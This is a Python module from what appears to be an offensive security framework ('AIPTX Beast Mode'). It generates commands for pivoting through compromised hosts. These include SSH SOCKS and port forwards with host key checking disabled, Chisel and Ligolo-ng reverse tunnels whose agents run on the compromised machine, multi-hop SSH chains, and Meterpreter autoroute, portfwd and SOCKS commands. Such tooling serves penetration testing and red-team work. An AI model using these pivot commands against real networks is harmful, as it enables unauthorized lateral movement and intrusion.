"""
AIPTX Beast Mode - Pivot Manager
================================

Manage SOCKS proxies and pivoting through compromised hosts.
"""

from __future__ import annotations

import logging
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

logger = logging.getLogger(__name__)


class PivotType(str, Enum):
    """Types of pivot connections."""
    SOCKS4 = "socks4"
    SOCKS5 = "socks5"
    SSH_DYNAMIC = "ssh_dynamic"
    SSH_LOCAL = "ssh_local"
    SSH_REMOTE = "ssh_remote"
    CHISEL = "chisel"
    LIGOLO = "ligolo"


@dataclass
class PivotSession:
    """Represents an active pivot session."""
    session_id: str
    pivot_type: PivotType
    local_port: int
    remote_host: str
    remote_port: int
    target_network: str | None = None
    username: str | None = None
    status: str = "inactive"
    process_id: int | None = None
    established_at: float | None = None
    metadata: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "session_id": self.session_id,
            "pivot_type": self.pivot_type.value,
            "local_port": self.local_port,
            "remote_host": self.remote_host,
            "remote_port": self.remote_port,
            "target_network": self.target_network,
            "username": self.username,
            "status": self.status,
            "process_id": self.process_id,
            "established_at": self.established_at,
            "metadata": self.metadata,
        }


class PivotManager:
    """
    Manage network pivoting through compromised hosts.

    Supports multiple pivot types including SOCKS proxies,
    SSH tunnels, and specialized pivoting tools.
    """

    def __init__(self):
        """Initialize the pivot manager."""
        self._sessions: dict[str, PivotSession] = {}
        self._next_port = 9050  # Start SOCKS ports from 9050

    def get_socks_command(
        self,
        pivot_type: PivotType,
        remote_host: str,
        local_port: int | None = None,
        username: str = "root",
        remote_port: int = 22,
        key_file: str | None = None,
    ) -> dict[str, Any]:
        """
        Get command to establish SOCKS proxy.

        Args:
            pivot_type: Type of pivot to establish
            remote_host: Host to pivot through
            local_port: Local port for SOCKS proxy
            username: SSH username
            remote_port: SSH port on remote host
            key_file: Path to SSH private key

        Returns:
            Command configuration dict
        """
        if local_port is None:
            local_port = self._get_next_port()

        if pivot_type == PivotType.SSH_DYNAMIC:
            # SSH dynamic port forwarding (SOCKS5)
            cmd_parts = [
                "ssh",
                "-D", str(local_port),
                "-N",  # No remote command
                "-f",  # Background
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
            ]
            if key_file:
                cmd_parts.extend(["-i", key_file])
            cmd_parts.extend(["-p", str(remote_port)])
            cmd_parts.append(f"{username}@{remote_host}")

            return {
                "command": " ".join(cmd_parts),
                "local_port": local_port,
                "pivot_type": pivot_type.value,
                "description": f"SSH SOCKS5 proxy via {remote_host}:{remote_port}",
                "usage": f"Use proxychains or --proxy socks5://127.0.0.1:{local_port}",
            }

        elif pivot_type == PivotType.CHISEL:
            # Chisel reverse SOCKS
            server_cmd = f"chisel server --reverse --port {local_port}"
            client_cmd = f"chisel client {remote_host}:{local_port} R:socks"

            return {
                "server_command": server_cmd,
                "client_command": client_cmd,
                "local_port": local_port,
                "pivot_type": pivot_type.value,
                "description": "Chisel reverse SOCKS tunnel",
                "notes": "Run server locally, client on compromised host",
            }

        elif pivot_type == PivotType.LIGOLO:
            # Ligolo-ng proxy
            return {
                "proxy_command": f"./ligolo-proxy -selfcert -laddr 0.0.0.0:{local_port}",
                "agent_command": f"./ligolo-agent -connect {remote_host}:{local_port} -ignore-cert",
                "local_port": local_port,
                "pivot_type": pivot_type.value,
                "description": "Ligolo-ng tunnel",
                "notes": "Add routes after connection: ip route add <target_net> dev ligolo",
            }

        return {"error": f"Unsupported pivot type: {pivot_type}"}

    def get_proxychains_config(self, sessions: list[PivotSession] | None = None) -> str:
        """
        Generate proxychains configuration for active pivots.

        Args:
            sessions: Specific sessions to include, or all active

        Returns:
            Proxychains configuration content
        """
        if sessions is None:
            sessions = [s for s in self._sessions.values() if s.status == "active"]

        config_lines = [
            "# AIPTX Beast Mode - Auto-generated proxychains config",
            "strict_chain",
            "proxy_dns",
            "tcp_read_time_out 15000",
            "tcp_connect_time_out 8000",
            "",
            "[ProxyList]",
        ]

        for session in sessions:
            if session.pivot_type in (PivotType.SSH_DYNAMIC, PivotType.SOCKS5):
                config_lines.append(f"socks5 127.0.0.1 {session.local_port}")
            elif session.pivot_type == PivotType.SOCKS4:
                config_lines.append(f"socks4 127.0.0.1 {session.local_port}")

        return "\n".join(config_lines)

    def get_pivot_chain_commands(
        self,
        hops: list[dict[str, str]],
        final_target: str,
        final_port: int,
    ) -> list[dict[str, str]]:
        """
        Get commands for multi-hop pivoting.

        Args:
            hops: List of pivot hops [{host, user, port, key}]
            final_target: Ultimate target to reach
            final_port: Port on final target

        Returns:
            List of commands to establish chain
        """
        commands = []
        base_port = self._get_next_port()

        for i, hop in enumerate(hops):
            local_port = base_port + i

            if i == len(hops) - 1:
                # Last hop - local forward to final target
                cmd = (
                    f"ssh -L {local_port}:{final_target}:{final_port} "
                    f"-o StrictHostKeyChecking=no "
                    f"-p {hop.get('port', 22)} "
                )
                if hop.get('key'):
                    cmd += f"-i {hop['key']} "
                cmd += f"{hop.get('user', 'root')}@{hop['host']}"

                commands.append({
                    "step": i + 1,
                    "command": cmd,
                    "description": f"Forward to {final_target}:{final_port} through {hop['host']}",
                    "access": f"Connect to 127.0.0.1:{local_port}",
                })
            else:
                # Intermediate hop - dynamic forward
                next_hop = hops[i + 1]
                cmd = (
                    f"ssh -D {local_port} "
                    f"-o StrictHostKeyChecking=no "
                    f"-p {hop.get('port', 22)} "
                )
                if hop.get('key'):
                    cmd += f"-i {hop['key']} "
                cmd += f"{hop.get('user', 'root')}@{hop['host']}"

                commands.append({
                    "step": i + 1,
                    "command": cmd,
                    "description": f"SOCKS proxy through {hop['host']}",
                    "next_hop": next_hop['host'],
                })

        return commands

    def create_session(
        self,
        pivot_type: PivotType,
        remote_host: str,
        local_port: int,
        **kwargs,
    ) -> PivotSession:
        """
        Create a new pivot session record.

        Args:
            pivot_type: Type of pivot
            remote_host: Remote host being used
            local_port: Local port for proxy
            **kwargs: Additional session parameters

        Returns:
            Created PivotSession
        """
        import hashlib
        session_id = hashlib.md5(
            f"{pivot_type}{remote_host}{local_port}{time.time()}".encode()
        ).hexdigest()[:12]

        session = PivotSession(
            session_id=session_id,
            pivot_type=pivot_type,
            local_port=local_port,
            remote_host=remote_host,
            remote_port=kwargs.get("remote_port", 22),
            target_network=kwargs.get("target_network"),
            username=kwargs.get("username"),
            status="inactive",
            metadata=kwargs.get("metadata", {}),
        )

        self._sessions[session_id] = session
        return session

    def activate_session(self, session_id: str, process_id: int | None = None) -> bool:
        """Mark a session as active."""
        if session_id in self._sessions:
            self._sessions[session_id].status = "active"
            self._sessions[session_id].process_id = process_id
            self._sessions[session_id].established_at = time.time()
            return True
        return False

    def deactivate_session(self, session_id: str) -> bool:
        """Mark a session as inactive."""
        if session_id in self._sessions:
            self._sessions[session_id].status = "inactive"
            return True
        return False

    def get_active_sessions(self) -> list[PivotSession]:
        """Get all active pivot sessions."""
        return [s for s in self._sessions.values() if s.status == "active"]

    def get_session(self, session_id: str) -> PivotSession | None:
        """Get a specific session."""
        return self._sessions.get(session_id)

    def _get_next_port(self) -> int:
        """Get next available local port."""
        port = self._next_port
        self._next_port += 1
        return port

    def get_meterpreter_pivot_commands(self) -> list[dict[str, str]]:
        """Get Metasploit/Meterpreter pivot commands."""
        return [
            {
                "name": "route_add",
                "command": "run autoroute -s <subnet>/<cidr>",
                "description": "Add route through Meterpreter session",
            },
            {
                "name": "socks_proxy",
                "command": "use auxiliary/server/socks_proxy\nset SRVPORT 9050\nrun",
                "description": "Start SOCKS proxy in Metasploit",
            },
            {
                "name": "portfwd_local",
                "command": "portfwd add -l <lport> -p <rport> -r <rhost>",
                "description": "Local port forward through session",
            },
            {
                "name": "portfwd_reverse",
                "command": "portfwd add -R -l <lport> -p <rport>",
                "description": "Reverse port forward",
            },
        ]


def get_pivot_commands(
    pivot_type: str,
    remote_host: str,
    local_port: int = 9050,
    **kwargs,
) -> dict[str, Any]:
    """Convenience function to get pivot commands."""
    manager = PivotManager()
    return manager.get_socks_command(
        pivot_type=PivotType(pivot_type),
        remote_host=remote_host,
        local_port=local_port,
        **kwargs,
    )


__all__ = [
    "PivotType",
    "PivotSession",
    "PivotManager",
    "get_pivot_commands",
]
